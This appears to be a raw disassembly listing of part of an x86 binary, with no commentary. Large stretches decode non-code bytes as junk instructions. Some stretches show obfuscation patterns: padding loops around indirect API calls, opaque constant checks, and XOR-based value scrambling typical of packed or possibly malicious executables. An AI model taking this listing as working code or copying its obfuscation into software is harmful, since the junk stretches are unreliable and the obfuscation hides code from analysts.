  407c98:	pop    ecx
  407c99:	inc    ecx
  407c9a:	dec    eax
  407c9b:	in     eax,0x32
  407c9d:	add    edi,DWORD PTR [eax-0x43]
  407ca0:	cli    
  407ca1:	aad    0xc
  407ca3:	lods   al,BYTE PTR ds:[esi]
  407ca4:	mov    ?,eax
  407ca6:	mov    ah,0x64
  407ca8:	psrld  mm4,QWORD PTR [ebp+0x48]
  407cac:	dec    ebp
  407cad:	pop    ecx
  407cae:	push   cs
  407caf:	dec    eax
  407cb0:	adc    ebx,edx
  407cb2:	je     0x407c52
  407cb4:	push   es
  407cb5:	inc    ebx
  407cb6:	js     0x407cb9
  407cb8:	repnz pop ecx
  407cba:	in     eax,0xfc
  407cbc:	bound  esi,QWORD PTR [ebp+0x36]
  407cbf:	jb     0x407d04
  407cc1:	sahf   
  407cc2:	das    
  407cc3:	adc    cl,BYTE PTR [ebp-0x7d07fe56]
  407cc9:	cld    
  407cca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ccb:	retf   
  407ccc:	sub    esp,0xffffffa6
  407ccf:	inc    edx
  407cd0:	(bad)  
  407cd1:	mov    bl,0x32
  407cd3:	sbb    BYTE PTR [ecx+0x71],ch
  407cd6:	mov    eax,0xb9349e72
  407cdb:	daa    
  407cdc:	int3   
  407cdd:	test   al,0xd4
  407cdf:	mov    dl,0xb0
  407ce1:	pop    edi
  407ce2:	cs jecxz 0x407d17
  407ce5:	add    al,BYTE PTR [esi-0x62]
  407ce8:	jnp    0x407c6a
  407cea:	cmp    dh,BYTE PTR [esi-0x79]
  407ced:	lahf   
  407cee:	mov    ds:0x8502f1c6,eax
  407cf3:	dec    esp
  407cf4:	mov    ah,BYTE PTR ss:[eax]
  407cf7:	stos   BYTE PTR es:[edi],al
  407cf8:	fld    QWORD PTR [edx+0x481543b2]
  407cfe:	xor    al,0xa8
  407d00:	ret    0xa93c
  407d03:	fldcw  WORD PTR [edx]
  407d05:	mov    ebx,0x16403135
  407d0a:	xchg   esi,eax
  407d0b:	lods   eax,DWORD PTR ds:[esi]
  407d0c:	jbe    0x407d31
  407d0e:	add    al,0x46
  407d10:	dec    esp
  407d11:	aam    0x62
  407d13:	sti    
  407d14:	in     al,dx
  407d15:	test   BYTE PTR [esi+edx*2+0x56],dh
  407d19:	cmp    bl,bh
  407d1b:	cld    
  407d1c:	xor    DWORD PTR [edi-0x7c],edx
  407d1f:	mov    al,0x4b
  407d21:	ret    0x3359
  407d24:	aad    0x95
  407d26:	repnz mov eax,ds:0x261dafb3
  407d2c:	inc    edx
  407d2d:	cli    
  407d2e:	iret   
  407d2f:	std    
  407d30:	dec    esi
  407d31:	or     edi,DWORD PTR [ebp-0x2f]
  407d34:	dec    ebp
  407d35:	out    dx,eax
  407d36:	mov    edi,0xae7654b9
  407d3b:	cdq    
  407d3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d3d:	xor    BYTE PTR [ecx+0x1a261959],al
  407d43:	cmp    dh,BYTE PTR [edi-0x4c98f477]
  407d49:	js     0x407db8
  407d4b:	push   ecx
  407d4c:	(bad)  
  407d4d:	jmp    0x407d3c
  407d4f:	cmp    eax,0xf0b0e450
  407d54:	stos   BYTE PTR es:[edi],al
  407d55:	add    bh,0x3b
  407d58:	popa   
  407d59:	ret    
  407d5a:	popf   
  407d5b:	jae    0x407dbc
  407d5d:	inc    edx
  407d5e:	pop    ebx
  407d5f:	(bad)  
  407d60:	int3   
  407d61:	mov    ebx,0x192ca22
  407d66:	mov    ebp,edi
  407d68:	mov    dl,0xa4
  407d6a:	outs   dx,BYTE PTR ds:[esi]
  407d6b:	jge    0x407cef
  407d6d:	inc    eax
  407d6e:	dec    edx
  407d6f:	call   0x7a6cfbf7
  407d74:	icebp  
  407d75:	inc    ecx
  407d76:	push   cs
  407d77:	sub    DWORD PTR [esi+eax*8],edi
  407d7a:	std    
  407d7b:	test   al,0x65
  407d7d:	xor    al,0x55
  407d7f:	fucomip st,st(7)
  407d81:	cmp    DWORD PTR [ecx-0x73],esi
  407d84:	fs xchg ebx,eax
  407d86:	inc    esi
  407d87:	daa    
  407d88:	jns    0x407d2c
  407d8a:	loop   0x407d21
  407d8c:	retf   
  407d8d:	push   es
  407d8e:	mov    DWORD PTR [edx-0x11b836f4],ebx
  407d94:	mov    eax,0x3c715432
  407d99:	int    0xb5
  407d9b:	ss dec eax
  407d9d:	sbb    DWORD PTR [ecx-0x48687afe],ecx
  407da3:	shl    bl,1
  407da5:	push   ebx
  407da6:	in     al,0xd
  407da8:	int    0x40
  407daa:	dec    ecx
  407dab:	std    
  407dac:	and    DWORD PTR [ebx+0x0],eax
  407daf:	imul   ebp,edi,0x4a
  407db2:	xchg   ebx,eax
  407db3:	test   BYTE PTR [eax+0x48],cl
  407db6:	clc    
  407db7:	jbe    0x407d3b
  407db9:	repnz scas eax,DWORD PTR es:[edi]
  407dbb:	arpl   WORD PTR [ebp+ebp*2+0x62],di
  407dbf:	les    esi,FWORD PTR [edx]
  407dc1:	jmp    0x407e35
  407dc3:	call   0x71748655
  407dc8:	or     cl,BYTE PTR [ecx-0x3f]
  407dcb:	cld    
  407dcc:	lods   al,BYTE PTR ds:[esi]
  407dcd:	jp     0x407e08
  407dcf:	mov    esi,ds
  407dd1:	pop    edx
  407dd2:	je     0x407dd9
  407dd4:	push   esp
  407dd5:	arpl   WORD PTR [esi],cx
  407dd7:	(bad)  
  407dd8:	imul   DWORD PTR [ebx+0x5bb96edf]
  407dde:	sbb    ecx,DWORD PTR [eax+0x12a5edc1]
  407de4:	imul   edx,ecx,0xe81f33a1
  407dea:	outs   dx,DWORD PTR ds:[esi]
  407deb:	je     0x407d78
  407ded:	mov    WORD PTR [ebx+0xa],fs
  407df0:	and    cl,BYTE PTR [esi+0x329b7dd1]
  407df6:	xlat   BYTE PTR ds:[ebx]
  407df7:	cmp    esp,DWORD PTR [ebx]
  407df9:	clc    
  407dfa:	add    DWORD PTR [esi+0x4b],edi
  407dfd:	sbb    esi,DWORD PTR [eax+0x7e]
  407e00:	cmp    eax,DWORD PTR [edx-0x68d4f458]
  407e06:	(bad)  
  407e07:	xchg   esi,eax
  407e08:	pop    ebx
  407e09:	(bad)  
  407e0a:	das    
  407e0b:	(bad)  
  407e0c:	and    al,0x4a
  407e0e:	(bad)  
  407e0f:	sub    cl,ch
  407e11:	or     DWORD PTR [ebx-0x6c3d7f12],edi
  407e17:	sbb    esi,DWORD PTR [eax]
  407e19:	xchg   DWORD PTR [esi-0x4],edx
  407e1c:	dec    ebp
  407e1d:	icebp  
  407e1e:	(bad)  
  407e1f:	mov    dl,0x16
  407e21:	in     eax,dx
  407e22:	int    0x8e
  407e24:	add    DWORD PTR [esi],eax
  407e26:	add    al,0x7f
  407e28:	dec    esi
  407e29:	mov    edx,0x11fc3fc0
  407e2e:	pop    eax
  407e2f:	inc    ebp
  407e30:	and    ebx,DWORD PTR [ebp-0x1]
  407e33:	call   0x26f056ff
  407e38:	ret    
  407e39:	div    ebx
  407e3b:	dec    edx
  407e3c:	jnp    0x407e67
  407e3e:	dec    esi
  407e3f:	mov    ah,BYTE PTR [ebp+0x5]
  407e42:	pushw  ss
  407e44:	pop    ecx
  407e45:	push   eax
  407e46:	mov    ecx,0xe829ac97
  407e4b:	fs loopne 0x407eb8
  407e4e:	repnz mov ecx,0xf9b636e6
  407e54:	ins    DWORD PTR es:[edi],dx
  407e55:	adc    BYTE PTR [esi],bl
  407e57:	push   ebp
  407e58:	sbb    BYTE PTR [esi-0x73],bh
  407e5b:	jnp    0x407eb6
  407e5d:	and    eax,0x89787f14
  407e62:	adc    BYTE PTR [ebx-0xdc20bbb],cl
  407e68:	and    DWORD PTR [edi],esi
  407e6a:	or     BYTE PTR [edi],0x84
  407e6d:	pop    ss
  407e6e:	add    BYTE PTR [eax],al
  407e70:	add    BYTE PTR [ebx+0x881e445],cl
  407e76:	sahf   
  407e77:	sbb    al,0x75
  407e79:	pusha  
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x4337eb
  407f81:	or     DWORD PTR ds:0x4337ef,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x433857,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x433853,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43389b
  407fad:	sub    DWORD PTR ds:0x433827,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x4337db
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x43382b,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x43382b
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x43382b,ebx
  407fdd:	cmp    DWORD PTR ds:0x43382b,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x43382b,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x433a67
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x43382b,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x43382b
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x43382b,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x43382b,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x43382b
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x43382b,ebx
  408048:	cmp    DWORD PTR ds:0x43382b,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x43382b,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x43382b,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x43382b
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x43382b,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x43377b,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x43385b
  4080b1:	and    DWORD PTR ds:0x433863,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43381b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x4338a3,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x4338a3
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x4338a3,ebx
  4080e3:	cmp    DWORD PTR ds:0x4338a3,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x43385b
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x4338a3,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x4338a3
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x4338a3,ebx
  40811d:	cmp    DWORD PTR ds:0x4338a3,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433897,0x1f
  40813b:	cmp    DWORD PTR ds:0x433897,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433897,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433897
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433897,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0xe87aee0d
  408191:	pop    es
  408192:	ds retf 0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	add    DWORD PTR [edi],eax
  40819c:	adc    BYTE PTR [esi],dl
  40819e:	lahf   
  40819f:	or     bl,BYTE PTR fs:[ecx*2+0x6d98850]
  4081a7:	xor    DWORD PTR [edx+edi*8],ebp
  4081aa:	test   al,ah
  4081ac:	mov    esp,DWORD PTR [edx]
  4081ae:	and    esp,edi
  4081b0:	(bad)  
  4081b2:	test   eax,0x49dee648
  4081b7:	popf   
  4081b8:	cmc    
  4081b9:	jmp    0xf6b00153
  4081be:	fbld   TBYTE PTR [edx]
  4081c0:	(bad)  
  4081c1:	jbe    0x40819a
  4081c3:	push   0x19702795
  4081c8:	mov    esi,0x99cb192
  4081cd:	(bad)  
  4081ce:	mov    ebx,0xb2dd587e
  4081d3:	test   eax,0x2c6cc8cc
  4081d8:	das    
  4081d9:	xor    DWORD PTR [ecx-0x21ab9d47],0xa07aa40e
  4081e3:	(bad)  
  4081e5:	loope  0x408170
  4081e7:	ret    0xc867
  4081ea:	in     al,dx
  4081eb:	fucomip st,st(5)
  4081ed:	into   
  4081ee:	rcr    DWORD PTR [eax],0xb4
  4081f1:	cmp    eax,0x2a22a400
  4081f6:	xor    edx,DWORD PTR [edx]
  4081f8:	retf   
  4081f9:	jb     0x40826b
  4081fb:	push   edi
  4081fc:	ds push ss
  4081fe:	push   cs
  4081ff:	push   0xfd662ccf
  408204:	dec    esi
  408205:	scas   al,BYTE PTR es:[edi]
  408206:	stos   DWORD PTR es:[edi],eax
  408207:	sbb    ah,BYTE PTR [ebx-0x557df94f]
  40820d:	(bad)  
  40820e:	mov    al,ds:0x50bfe44a
  408213:	icebp  
  408214:	(bad)  
  408216:	out    dx,eax
  408217:	mov    ebp,0xaa00fcad
  40821c:	push   ss
  40821d:	mov    ds:0x1f892535,eax
  408222:	outs   dx,DWORD PTR ds:[esi]
  408223:	mov    dh,0xd6
  408225:	jmp    FWORD PTR [eax]
  408227:	push   cs
  408228:	inc    eax
  408229:	dec    eax
  40822a:	mov    esp,eax
  40822c:	sbb    BYTE PTR [esi],bh
  40822e:	test   al,0xde
  408230:	cmp    ebx,DWORD PTR [edx]
  408232:	(bad)  
  408233:	ss mov edx,0x314aa47b
  408239:	ret    0x5352
  40823c:	lea    edx,[edx-0x6e]
  40823f:	sub    cl,BYTE PTR [edi+edi*2-0x52]
  408243:	mov    BYTE PTR [edi-0x24caeaf7],al
  408249:	adc    BYTE PTR [edx],bh
  40824b:	cdq    
  40824c:	lahf   
  40824d:	leave  
  40824e:	loop   0x40824a
  408250:	jbe    0x4081e3
  408252:	outs   dx,DWORD PTR ds:[esi]
  408253:	inc    ebp
  408254:	push   cs
  408255:	call   0x4ac3:0xe92a5141
  40825c:	push   ss
  40825d:	stc    
  40825e:	pop    ds
  40825f:	fs jno 0x408297
  408262:	xchg   esp,eax
  408263:	addr16 (bad) 
  408265:	(bad)  
  408266:	jl     0x40821c
  408268:	mov    esi,esp
  40826a:	fidiv  WORD PTR [ecx+0x36]
  40826d:	sub    ecx,DWORD PTR [edi]
  40826f:	jne    0x408212
  408271:	popa   
  408272:	pop    es
  408273:	pop    DWORD PTR [edi+ecx*2-0x28]
  408277:	pop    eax
  408278:	loop   0x4082cc
  40827a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40827b:	jg     0x4082cf
  40827d:	cli    
  40827e:	adc    BYTE PTR [edi-0x6907ddc4],ch
  408284:	inc    eax
  408285:	adc    ebp,DWORD PTR [edi-0x24]
  408288:	cdq    
  408289:	(bad)  
  40828b:	inc    esp
  40828c:	test   cl,cl
  40828e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40828f:	mov    DWORD PTR [edi-0x41],edx
  408292:	mov    ah,0x77
  408294:	cmp    ebx,DWORD PTR ds:0xea8bf0ef
  40829a:	jno    0x4082bf
  40829c:	push   ecx
  40829d:	mov    edx,0x1881425c
  4082a2:	dec    BYTE PTR [edx+0x5d04b10e]
  4082a8:	pop    ds
  4082a9:	mov    DWORD PTR cs:[ebx],ecx
  4082ac:	mov    bl,0x2a
  4082ae:	jl     0x4082e7
  4082b0:	fstp   DWORD PTR [esi-0x22]
  4082b3:	or     DWORD PTR [esp+eax*4],edi
  4082b6:	mov    ah,0xc5
  4082b8:	fisubr DWORD PTR [ebx]
  4082ba:	inc    edx
  4082bb:	jo     0x408314
  4082bd:	inc    eax
  4082be:	mov    ah,0xd1
  4082c0:	bnd jb 0x4082bd
  4082c3:	scas   eax,DWORD PTR es:[edi]
  4082c4:	aam    0xf1
  4082c6:	sbb    edx,eax
  4082c8:	out    dx,eax
  4082c9:	mov    WORD PTR [edx-0x72f02371],gs
  4082cf:	in     eax,dx
  4082d0:	cmp    DWORD PTR [ebx+0x7e51f494],esp
  4082d6:	gs jecxz 0x4082c2
  4082d9:	sub    BYTE PTR [eax],0x9d
  4082dc:	jb     0x4082b3
  4082de:	ret    0x5b86
  4082e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082e2:	(bad)  
  4082e3:	(bad)  
  4082e4:	sbb    esp,DWORD PTR gs:[ebp+0x55a8f1ee]
  4082eb:	adc    edi,DWORD PTR [esi+0x5680039]
  4082f1:	xor    cl,BYTE PTR [eax+0x79]
  4082f4:	xor    DWORD PTR [ebx+0x4f],ecx
  4082f7:	adc    al,0xfa
  4082f9:	add    BYTE PTR [edi-0x1b75b36e],0xb
  408300:	ja     0x4082e2
  408302:	gs loopne 0x40835a
  408305:	fsubr  DWORD PTR [edx]
  408307:	fst    DWORD PTR [esi+0x2d57446a]
  40830d:	mov    BYTE PTR [esi],ah
  40830f:	iret   
  408310:	jo     0x40838b
  408312:	push   esi
  408313:	mov    ss,edx
  408315:	mov    esp,0xed7991cf
  40831a:	mov    cl,0x62
  40831c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40831d:	sub    BYTE PTR [eax+edi*8+0x6d],bh
  408321:	fadd   st(1),st
  408323:	idiv   edi
  408325:	stos   DWORD PTR es:[edi],eax
  408326:	in     al,dx
  408327:	mov    edi,0x9e4776b0
  40832c:	mov    edi,0x95b3ec59
  408331:	push   esi
  408332:	or     dl,al
  408334:	test   edx,esi
  408336:	cmp    esp,DWORD PTR [esi-0x2c]
  408339:	jae    0x40834c
  40833b:	xchg   BYTE PTR ds:0x68588f8c,cl
  408341:	mov    BYTE PTR [ebx],ch
  408343:	es mov bl,0xfb
  408346:	and    DWORD PTR [ebp-0x468d0f12],esi
  40834c:	pop    esp
  40834d:	mov    ah,BYTE PTR [esi-0x8]
  408350:	dec    ebp
  408351:	jbe    0x4083bd
  408353:	into   
  408354:	add    cl,ah
  408356:	cmp    esi,DWORD PTR [esi+0x2597f021]
  40835c:	dec    edi
  40835d:	cmp    al,0xc7
  40835f:	arpl   WORD PTR [ecx-0xa715784],bx
  408365:	push   edi
  408366:	ds cld 
  408368:	sub    eax,0x9590023c
  40836d:	(bad)
  408370:	les    edx,FWORD PTR [edx]
  408372:	mov    esp,0x22ecb877
  408377:	sub    ecx,ecx
  408379:	jl     0x408359
  40837b:	call   0x62b0daa8
  408380:	pushf  
  408381:	jno    0x4083ac
  408383:	and    al,0x8d
  408385:	ror    BYTE PTR [esi+0x1d4e7a0e],0xa6
  40838c:	scas   eax,DWORD PTR es:[edi]
  40838d:	inc    esp
  40838e:	mov    edi,0x5edb1291
  408393:	cwde   
  408394:	stos   BYTE PTR es:[edi],al
  408395:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408396:	mov    ds:0xf00d8b92,eax
  40839b:	mov    edx,0xaa018e42
  4083a0:	into   
  4083a1:	test   DWORD PTR [ecx+0x799f467d],edi
  4083a7:	clc    
  4083a8:	loop   0x4083a8
  4083aa:	in     al,dx
  4083ab:	push   cs
  4083ac:	mov    bl,ch
  4083ae:	js     0x4083d5
  4083b0:	sbb    BYTE PTR [edx+0x8a537a2],bh
  4083b6:	push   0xeb404c0c
  4083bb:	div    BYTE PTR [ebx+0x7cfab54d]
  4083c1:	cmp    al,0x4e
  4083c3:	xchg   ebx,eax
  4083c4:	mov    DWORD PTR [ebp-0x20],eax
  4083c7:	and    DWORD PTR ds:0x4337db,0x0
  4083d1:	mov    eax,ds:0x4337db
  4083d6:	inc    eax
  4083d7:	mov    ds:0x4337db,eax
  4083dc:	cmp    DWORD PTR ds:0x4337db,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x4337db,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x4337db
  40840c:	inc    eax
  40840d:	mov    ds:0x4337db,eax
  408412:	cmp    DWORD PTR ds:0x4337db,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43378b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433793,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x4338a7
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	ret    
  408465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408466:	mov    esp,0x7ec8e4c3
  40846b:	jle    0x408491
  40846d:	jl     0x4084ed
  40846f:	jle    0x408442
  408471:	loopne 0x408473
  408473:	ja     0x4084b3
  408475:	js     0x408499
  408477:	test   BYTE PTR [ecx],0x83
  40847a:	mov    ebx,0xdd4f3e85
  40847f:	dec    esi
  408480:	(bad)
  408484:	jb     0x408502
  408486:	jns    0x4084a0
  408488:	push   ecx
  408489:	addr16 fs out 0xd0,al
  40848d:	sar    DWORD PTR [eax-0x69682e1e],cl
  408493:	mov    dl,0x73
  408495:	jae    0x408420
  408497:	sbb    ebp,ecx
  408499:	std    
  40849a:	shl    DWORD PTR [edx],0xad
  40849d:	add    eax,0x13168e9f
  4084a2:	nop
  4084a3:	daa    
  4084a4:	imul   ecx,DWORD PTR [ecx+0x5c3cbaa8],0xffffffb8
  4084ab:	mov    cl,0x5a
  4084ad:	add    BYTE PTR [edx],dl
  4084af:	sahf   
  4084b0:	es in  al,0xd3
  4084b3:	xchg   edi,eax
  4084b4:	add    DWORD PTR [edx-0x5d456f3f],ecx
  4084ba:	rol    esi,1
  4084bc:	mul    BYTE PTR ss:[ecx]
  4084bf:	add    al,0x8
  4084c1:	ds popa 
  4084c3:	push   ebp
  4084c4:	cwde   
  4084c5:	ret    
  4084c6:	xchg   BYTE PTR [edx+0x9],al
  4084c9:	jo     0x408519
  4084cb:	jae    0x408503
  4084cd:	mov    dh,bl
  4084cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084d0:	pop    esi
  4084d1:	adc    eax,0xac6102b8
  4084d6:	das    
  4084d7:	mov    dh,0xef
  4084d9:	cmp    eax,0x1d5e7e5a
  4084de:	and    al,0x3
  4084e0:	cmp    DWORD PTR [ebp+0xf6af830],esp
  4084e6:	retf   
  4084e7:	ja     0x4084bc
  4084e9:	lods   al,BYTE PTR ds:[esi]
  4084ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4084eb:	ficom  WORD PTR ds:0x306ed582
  4084f1:	sub    esi,DWORD PTR [ebx+0x16]
  4084f4:	xlat   BYTE PTR ds:[ebx]
  4084f5:	push   ebx
  4084f6:	pop    ebx
  4084f7:	push   ecx
  4084f8:	es dec eax
  4084fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084fb:	(bad)  
  4084fc:	out    0x20,al
  4084fe:	pop    edi
  4084ff:	add    BYTE PTR [edi],ch
  408501:	inc    edx
  408502:	mov    DWORD PTR [eax+ebx*4+0x75c9a319],ecx
  408509:	xchg   ecx,eax
  40850a:	fmul   QWORD PTR [edi]
  40850c:	rol    BYTE PTR [eax+0x60],0xa4
  408510:	dec    ebp
  408511:	add    BYTE PTR [ebx-0x847ba84],al
  408517:	lea    edi,[eax+0x23c42d1a]
  40851d:	pusha  
  40851e:	(bad)  
  40851f:	fdiv   QWORD PTR [ebp+esi*8+0x7b3291bc]
  408526:	scas   al,BYTE PTR es:[edi]
  408527:	sar    BYTE PTR [ebp+0x24567803],cl
  40852d:	idiv   BYTE PTR [edx-0x4]
  408530:	dec    edx
  408531:	pop    ss
  408532:	push   0x29d67088
  408537:	sub    ebp,DWORD PTR [ebx]
  408539:	mov    WORD PTR [edi+eiz*8+0x68],fs
  40853d:	push   edx
  40853e:	ja     0x408521
  408540:	jge    0x40855a
  408542:	pop    ss
  408543:	cmp    al,0xf6
  408545:	dec    edx
  408546:	pusha  
  408547:	cdq    
  408548:	sbb    DWORD PTR [ebx+0x69],0xfffffff7
  40854c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40854d:	adc    al,ch
  40854f:	inc    ebx
  408550:	pop    ds
  408551:	mov    eax,0xdf553bc
  408556:	mov    esp,0x273c4390
  40855b:	(bad)  
  40855c:	lods   eax,DWORD PTR ds:[esi]
  40855d:	lock cmp eax,0xfc0115c7
  408563:	outs   dx,DWORD PTR ds:[esi]
  408564:	xchg   eax,eax
  408566:	ins    BYTE PTR es:[edi],dx
  408567:	out    0xbd,al
